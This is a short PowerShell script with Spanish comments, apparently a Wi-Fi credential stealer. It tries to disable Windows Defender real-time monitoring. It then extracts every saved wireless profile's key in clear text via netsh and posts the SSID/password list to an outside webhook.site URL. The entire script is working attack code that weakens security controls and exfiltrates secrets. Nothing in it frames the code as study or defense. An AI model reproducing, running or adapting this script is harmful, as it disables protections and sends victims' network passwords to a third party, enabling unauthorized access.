# 1. Intentar desactivar Defender
Set-MpPreference -DisableRealtimeMonitoring $true -EA 0

# 2. Obtener nombres de perfiles (limpio)
$profiles = netsh wlan show prof | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | Where-Object { $_ -notmatch "Profile" }

# 3. Construir la lista de claves
$results = foreach ($n in $profiles) {
    $res = netsh wlan show prof name="$n" key=clear
    $k = $res | Select-String "Key Content\W+:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    if ($k) { "SSID: $n | Pass: $k" }
}

# 4. Enviar si hay datos
if ($results) {
    $payload = $results -join "`n"
    Invoke-RestMethod -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $payload -UseBasicParsing
}
